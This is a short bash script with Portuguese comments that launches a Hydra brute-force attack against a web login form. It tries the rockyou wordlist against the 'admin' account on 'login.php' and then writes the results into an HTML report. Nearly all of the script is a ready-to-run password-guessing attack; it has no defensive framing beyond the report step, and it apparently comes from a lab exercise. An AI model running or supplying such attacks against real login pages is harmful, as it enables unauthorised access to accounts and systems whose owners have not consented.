#!/bin/bash
echo "Iniciando ataque com Hydra..."

# Comando Hydra para realizar o ataque de força bruta
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "login.php:username=^USER^&password=^PASS^:Login failed" -V -o hydra-output.txt

# Gerando o relatório em HTML
echo "<html><body><h1>Relatório do Ataque Hydra</h1><pre>" > relatorio.html
cat hydra-output.txt >> relatorio.html
echo "</pre></body></html>" >> relatorio.html

# Copiando o relatório para um arquivo com o nome final esperado
cp relatorio.html report.html
